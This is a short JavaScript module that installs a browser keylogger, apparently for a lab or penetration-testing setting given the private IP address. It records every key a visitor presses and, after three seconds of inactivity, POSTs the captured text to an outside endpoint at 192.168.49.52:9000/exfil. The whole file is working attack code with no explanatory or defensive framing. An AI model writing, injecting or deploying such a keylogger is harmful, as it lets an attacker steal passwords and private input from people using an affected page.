export default () => {
  let start_logger = () => {
    let buffer = "";
    let timer;
    let logKey = (event) => {
      buffer += event.key;
      clearTimeout(timer);
      timer = setTimeout(() => {
        fetch("http://192.168.49.52:9000/exfil", {
          method: "POST",
          body: buffer,
        });
        buffer = "";
      }, 3000);
    };
    return logKey;
  };
  document.addEventListener("keydown", start_logger());
};
